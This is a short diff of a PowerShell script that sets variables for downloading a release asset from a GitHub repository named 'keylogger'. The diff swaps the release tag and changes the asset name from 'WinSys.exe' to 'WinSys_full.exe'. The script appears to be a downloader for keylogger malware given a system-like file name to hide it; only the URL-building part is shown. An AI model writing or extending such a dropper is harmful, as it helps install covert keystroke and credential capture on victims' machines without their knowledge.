@@ -2,8 +2,8 @@
 # Define variables
 $repoOwner = "Su-nlight"                  # Replace with the repository owner
 $repoName = "keylogger"                    # Replace with the repository name
-$releaseTag = "v0.2.2-alpha"                # Replace with the desired release tag
-$assetName = "WinSys.exe"            # Replace with the asset file name you want to download
+$releaseTag = "v0.2.1-alpha"                # Replace with the desired release tag
+$assetName = "WinSys_full.exe"            # Replace with the asset file name you want to download
 $downloadUrl = "https://github.com/$repoOwner/$repoName/releases/download/$releaseTag/$assetName"
 
 # Define paths
